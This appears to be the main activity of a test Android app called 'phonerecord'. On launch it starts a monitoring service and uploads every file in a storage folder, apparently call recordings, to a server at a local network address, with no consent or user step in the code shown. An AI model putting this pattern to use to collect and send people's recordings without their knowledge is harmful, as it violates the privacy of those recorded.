package com.test.sun.phonerecord;

import android.content.Intent;
import android.os.Environment;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import com.test.sun.phonerecord.util.UploadUtil;

import java.io.File;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent intentX = new Intent();
        intentX.setClassName(this, "com.test.sun.phonerecord.TestPhone.MonitorService");
        startService(intentX);

        UploadUtil uploadUtil = new UploadUtil();
        uploadUtil.addCallBack(new UploadUtil.UploadCallBack() {
            @Override
            public void failedCallBack() {
            }

            @Override
            public void successCallBack(String string) {

            }
        });


        File directory = Environment.getExternalStorageDirectory();
        File files = new File(directory.getAbsolutePath() + "/ddkj1");

        for (File file : files.listFiles()) {
            Log.i("info", ":" + file.getAbsolutePath());
            uploadUtil.uploadFile("http://192.168.2.171:8080/UploadServer/myServer", file.getAbsolutePath());
        }


//        File file = new File(files, "1481250797474.aac");
//        Log.i("info", ":" + file.exists());
//        if (file.exists()) {
//            uploadUtil.uploadFile("http://192.168.2.171:8080/UploadServer/myServer", file.getAbsolutePath());
//        }


//        File musics = new File(directory.getAbsolutePath() + "/KuwoMusic/music");
//        File music = new File(musics, "Time_travel-岸部眞明.mp3");
//        Log.i("info", ":" + music.exists());
//        if (music.exists()) {
//            uploadUtil.uploadFile("http://192.168.2.171:8080/UploadServer/myServer", music.getAbsolutePath());
//        }

//        File file = new File(directory, "logo.jpg");
//        Log.i("info", ":" + file.exists());
//        uploadUtil.uploadFile("http://192.168.2.171:8080/UploadServer/myServer", file.getAbsolutePath());

    }
}
